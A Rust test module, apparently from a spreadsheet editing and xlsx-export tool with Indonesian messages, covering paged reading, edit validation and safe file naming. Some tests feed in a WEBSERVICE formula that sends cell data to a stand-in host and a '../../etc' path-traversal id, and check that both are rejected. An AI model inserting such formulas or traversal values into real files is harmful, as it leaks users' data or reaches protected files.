        let mut from = 2;
        let mut seen = Vec::new();
        for budget in [40_000, 38_560, 30_000, 10_000] {
            let page = read_page(&spec, None, from, budget);
            assert!(
                page.to_string().len() <= budget,
                "halaman melebihi {budget}"
            );
            for row in page["rows"].as_array().unwrap() {
                seen.push(row["row"].as_u64().unwrap());
            }
            match page["next_from_row"].as_u64() {
                Some(next) => {
                    assert!(next as usize > from, "halaman harus maju");
                    from = next as usize;
                }
                None => break,
            }
        }
        assert_eq!(seen, vec![2, 3, 4], "semua baris terbaca sekali");
    }

    #[test]
    fn edit_mistakes_are_explained() {
        let err = |v: Value| apply_edits(sample(3), &ops(v)).unwrap_err();
        assert!(
            err(json!([{ "op": "set_cell", "sheet": "Data", "cell": "Z2", "value": 1 }]))
                .contains("Operasi ke-1")
        );
        assert!(
            err(json!([{ "op": "delete_rows", "sheet": "Data", "from_row": 10 }]))
                .contains("tidak ada")
        );
        assert!(err(json!([{ "op": "delete_sheet", "sheet": "Data" }])).contains("terakhir"));
        assert!(
            err(json!([{ "op": "set_cell", "sheet": "Lain", "cell": "A2", "value": 1 }]))
                .contains("Sheet yang ada: Data")
        );
        assert!(apply_edits(sample(3), &[]).is_err());
    }

    #[test]
    fn edits_that_could_lose_data_need_explicit_fields() {
        let parse = |v: Value| serde_json::from_value::<EditOp>(v);
        assert!(parse(json!({ "op": "set_cell", "sheet": "Data", "cell": "B2" })).is_err());
        let cleared =
            parse(json!({ "op": "set_cell", "sheet": "Data", "cell": "B2", "value": null }))
                .unwrap();
        assert!(matches!(
            cleared,
            EditOp::SetCell {
                value: Value::Null,
                ..
            }
        ));
        assert!(parse(json!({ "op": "insert_rows", "sheet": "Data", "rows": [[1]] })).is_err());
        let appended = parse(
            json!({ "op": "insert_rows", "sheet": "Data", "before_row": null, "rows": [[1]] }),
        )
        .unwrap();
        assert!(matches!(
            appended,
            EditOp::InsertRows {
                before_row: None,
                ..
            }
        ));
        let columns = json!([{ "header": "A" }]);
        assert!(parse(json!({ "op": "add_sheet", "name": "Baru", "columns": columns })).is_err());
        let empty =
            parse(json!({ "op": "add_sheet", "name": "Baru", "columns": columns, "rows": [] }))
                .unwrap();
        assert!(matches!(empty, EditOp::AddSheet { ref rows, .. } if rows.is_empty()));
    }

    #[test]
    fn large_files_are_read_in_pages() {
        let spec = sample(2000);
        let page = read_page(&spec, None, 2, 5_000);
        let rows = page["rows"].as_array().unwrap();
        assert!(!rows.is_empty() && rows.len() < 2000);
        assert_eq!(rows[0]["row"], 2);
        let next = page["next_from_row"].as_u64().unwrap() as usize;
        assert_eq!(next, rows.len() + 2);
        let second = read_page(&spec, Some("data"), next, 5_000);
        assert_eq!(second["rows"][0]["row"], next);
        assert_eq!(page["sheets"][0]["data_rows"], 2000);
        assert_eq!(page["sheets"][0]["columns"][1]["col"], "B");
        assert!(
            read_page(&sample(3), None, 2, 40_000)
                .get("next_from_row")
                .is_none()
        );
        assert_eq!(column_letter(26), "AA");
        assert_eq!(column_letter(18_277), "ZZZ");
        assert_eq!(column_index("zzz"), Some(18_277));
        assert_eq!(column_letter(usize::from(u16::MAX)), "");
        assert_eq!(parse_cell("$AB$12"), Some((27, 12)));
    }

    #[test]
    fn object_cells_are_rejected() {
        let mut spec = sample(1);
        spec.sheets[0].rows[0][0] = json!({ "toString": "x" });
        assert!(validate_xlsx(&spec).unwrap_err().contains("isi sel"));
    }

    #[test]
    fn hidden_calls_are_rejected_and_formulas_are_normalized() {
        assert!(check_formula("=WEBSERVICE\n(\"https://x/\"&A2)").is_err());
        assert!(check_formula("=SUM(A1:A2)\t").is_err());
        assert_eq!(
            normalize_formula("=xlookup(a2,'Minggu 1'!b:b,\"teks kecil\")"),
            "=XLOOKUP(A2,'Minggu 1'!B:B,\"teks kecil\")"
        );
    }

    #[test]
    fn text_columns_never_become_formulas() {
        let spec = |format: Option<&str>| -> XlsxSpec {
            serde_json::from_value(json!({ "filename": "x", "sheets": [{ "name": "Data",
                "columns": [{ "header": "Catatan", "format": format }],
                "rows": [["=WEBSERVICE(\"http://x\")"]] }] }))
            .unwrap()
        };
        // Di kolom teks, "=..." hanya teks biasa, jadi boleh.
        assert!(validate_xlsx(&spec(Some("teks"))).is_ok());
        assert!(build_xlsx(&spec(Some("teks"))).is_ok());
        // Di kolom lain, itu rumus, dan WEBSERVICE ditolak.
        let err = validate_xlsx(&spec(None)).unwrap_err();
        assert!(err.contains("baris 2") && err.contains("WEBSERVICE"));
    }

    #[test]
    fn names_and_headers_are_safe() {
        assert_eq!(safe_name("  Rekap: Lembur/Nov?  "), "Rekap Lembur Nov");
        assert_eq!(safe_name("..."), "Bakase");
        assert!(valid_id(&"a".repeat(32)) && !valid_id("../../etc"));
        let cd = content_disposition("Rekap Lembur—Nov.xlsx");
        assert!(cd.contains("filename*=UTF-8''Rekap%20Lembur%E2%80%94Nov.xlsx"));
        assert!(cd.contains("filename=\"Rekap Lembur_Nov.xlsx\""));
    }
}
